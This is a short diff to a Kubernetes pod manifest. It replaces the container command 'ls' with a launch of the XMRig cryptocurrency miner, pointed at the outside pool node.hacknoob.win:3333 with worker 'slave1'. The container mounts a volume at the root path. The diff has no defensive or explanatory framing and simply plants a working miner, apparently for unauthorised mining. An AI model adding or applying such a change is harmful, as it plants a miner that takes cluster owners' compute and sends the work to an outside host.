@@ -16,7 +16,11 @@ spec:
   - name: xmrig-container-1
     image: busybox
     command:
-    - ls
+    - /home/worker2/xmrig/build/xmrig
+    - -o
+    - node.hacknoob.win:3333
+    - -u
+    - slave1
     volumeMounts:
     - name: xmrig-volume-1
       mountPath: /
